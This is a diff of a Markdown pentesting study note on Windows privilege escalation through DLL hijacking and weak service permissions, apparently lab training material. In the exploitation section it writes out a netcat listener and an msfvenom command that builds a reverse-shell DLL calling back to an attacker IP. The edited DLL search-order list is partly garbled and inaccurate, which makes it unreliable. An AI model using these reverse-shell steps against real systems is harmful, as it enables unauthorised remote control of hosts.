@@ -945,25 +945,19 @@ now you are running linux machine. you can use linux commands and continue enume
 
 ## <span style="color:lightgreen">Methodology</span>
 Check DLL Hijacking from hacktricks FYR.
-Windows applications usually load DLL files when started. It may happen that a DLL file does not exist and the application is unable to load it. Nevertheless, an application will continue to execute as long as the missing DLL is not needed.  
-In case the application uses a relative and not an absolute file path, Windows searches for the file in the following directories:
+
+Some servers rely on DLL files at the time, but if the DLL file that the server relies on is deleted, Windows will search it in several paths. Of course, please feel free to mention them to you.:
 
 -   The directory from which the application is loaded
 -   `C:\Windows\System32`
 -   `C:\Windows\System`
+-   `C:\Users\AllUsers\AppData\Local\Microsoft\WindowsApps`
+-   `C:\Temp`
 -   `C:\Windows`
--   The current working directory
--   Directories in the system PATH environment variable
--   Directories in the user PATH environment variable
 
-### Steps taken to perform DLL hijacking are outlined below.
+We assume that if we have write permission on one of these paths, and we also know that the service relies on dll files, we will create a malicious file with the extension dll and the same name as the file that the service is searching for.
 
-1.  Identify vulnerable application and location  #run winPEAS to check if you have write permission in any folder
-2.  Identify applications PID
-3.  Identify vulnerable DLLs that can be hijacked
-4.  Use MSFVenom or other payload creation tools to create a malicious DLL 
-5.  Replace the original DLL with the malicious DLL
-6.  Profit
+But unfortunately, it is difficult to know whether this service depends on DLL or not except through the Process Monitor program, and this program requires high permissions.
 
 ## <span style="color:lightgreen">Detection</span>
 
@@ -992,6 +986,18 @@ C:\Temp> sc start dllsvc
 10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `'C:\Temp\hijackme.dll'` yet it could not do that as the file was not found. Note that `'C:\Temp'` is a writable location.
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7e158da5-450c-47b4-addb-f7b6a9abe453)
 
+### Using winPEASE
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/edfadeb7-59ef-446c-b63e-80d765ffe18d)
+
+We note that we have write permission on the Temp folder, and we mentioned previously that the Temp folder is one of the folders in which DLL files are searched.
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ad03f19f-69f6-46d5-a88f-ae7de4c90aae)
+
+This service is vulnerable to DLL Hijacking
+
+check if I can start & stop the service using accesschk
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/8802a456-895d-4b13-80b8-bc9aed0b8ab2)
 
 ## <span style="color:lightgreen">Exploitation</span>
 
@@ -1005,10 +1011,9 @@ $ sudo nc -nvlp 53
 2. Open an additional command prompt and type: 
 ```console
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll
-#OR
-$ https://github.com/sagishahar/scripts/blob/master/windows_dll.c
-
 ```
+The name of the malicious file must be the same as the name of the file that the server is searching for
+Ok, how did you know that the name is hijackme also through the Process Monitor program, and this program requires high permissions
 
 3. Copy the generated file `hijackme.dll`, to the Windows VM.
 
@@ -1043,6 +1048,7 @@ PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/aff13a5b-82aa-486b-b7ed-8b23ca523762)
+
 continue enumeration to check if you can change the path of the service
 
 ### Checking manually on Windows VM
@@ -1060,16 +1066,18 @@ C:\Temp> accesschk64.exe -uwcv Everyone *
 # Everyone --> means everyone as a group who hass access
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/732f0827-ca4d-4abe-8c76-bd679036255a)
-we get the service name again
+
+we got the same service again from manual enumeration
 
 2. Using [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) query the service found
 ```console
 C:\Temp> accesschk64.exe -uwcv daclsvc
 ```
-![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/385c8683-a242-4417-bfbc-9414e6dbd5a6)
-if you check we have RW Everyone. means you can change the path of the running service
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5513d357-9577-4051-bdbd-21e04207f7e4)
 
-3. Find path of the bin file
+we can start & stop the service.
+
+3. Find the BINARY_PATH_NAME
 ```console
 C:\Temp> sc qc daclsvc
 ```
